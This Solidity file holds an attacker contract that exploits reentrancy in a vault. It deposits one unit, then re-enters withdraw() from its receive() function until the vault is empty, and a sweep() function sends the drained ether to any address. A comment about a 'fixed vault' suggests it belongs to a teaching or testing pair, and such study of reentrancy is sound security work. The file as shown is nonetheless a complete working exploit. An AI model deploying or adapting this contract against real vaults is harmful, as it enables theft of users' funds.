// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice The reentrancy attacker. It deposits one unit, then calls withdraw(); when the vault
/// sends the ETH, its receive() fires and RE-ENTERS withdraw() before the vault zeroed the balance,
/// looping until the vault is empty. On the fixed vault the re-entry does nothing, so it just gets
/// its own unit back.
contract Attacker {
    IVault public immutable vault;
    uint256 public constant UNIT = 0.01 ether;
    constructor(IVault _v) { vault = _v; }

    function attack() external payable {
        vault.deposit{value: UNIT}();     // seed one unit
        vault.withdraw();                 // triggers the re-entrant loop
    }

    receive() external payable {
        if (address(vault).balance >= UNIT) {
            // re-enter; low-level call so the fixed vault's revert doesn't cascade
            address(vault).call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function sweep(address to) external { (bool ok,) = to.call{value: address(this).balance}(""); require(ok); }
}
